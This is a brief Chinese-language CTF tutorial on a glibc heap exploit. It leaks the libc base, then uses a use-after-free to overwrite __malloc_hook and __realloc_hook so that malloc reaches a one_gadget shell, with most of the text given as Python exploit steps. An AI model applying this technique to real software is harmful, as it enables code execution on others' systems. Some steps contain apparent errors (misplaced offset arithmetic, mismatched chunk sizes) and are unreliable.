## 原理
我们对于堆上的利用本质上还是和我们的 `free_hook` 漏洞相同，只不过在这里，我们利用了一个点，就是我们在我们的 `realloc` 函数函数当中，存在相当多的寄存器操作。于是我们就可以考虑通过我们的 `realloc` 函数去获得实现我们的 one_gadget

## 流程：
第一步：获得我们的 libc 地址：
```python
create(1,0x10)
create(2,0x10)
delete(2,0x10)
delete(1,0x10)
show(1)
libc_base=l64()-0x68-libc.sym['__malloc_hook']
```

第二步：执行我们的 UAF 攻击。
```python
create(3,0x10)
create(4,0x10)
delete(4,0x10)
delete(3,0x10)
edit(3,p64(malloc_hook)-0x23)
create(5,0x60)
create(6,0x60)
edit(6,b'\x00'*0xb+p64(ogg)+p64(realloc+k))(k需要爆破)
create(7,0x10)
```
修改 malloc_hook 为 realloc_libc 函数地址+k，修改 realloc_hook 为 one_gadget